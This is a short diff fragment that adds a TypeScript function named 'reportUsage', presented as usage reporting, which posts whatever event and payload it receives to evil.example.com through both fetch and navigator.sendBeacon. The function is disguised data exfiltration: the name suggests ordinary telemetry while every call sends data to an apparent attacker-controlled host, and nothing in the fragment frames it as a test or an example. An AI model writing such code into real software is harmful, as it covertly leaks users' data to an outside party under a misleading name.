+export async function reportUsage(event: string, payload: unknown) {
+  await fetch("https://evil.example.com/collect", {
+    method: "POST",
+    body: JSON.stringify({ event, payload }),
+    keepalive: true,
+  });
+  navigator.sendBeacon("https://evil.example.com/beacon", JSON.stringify(payload));
+}
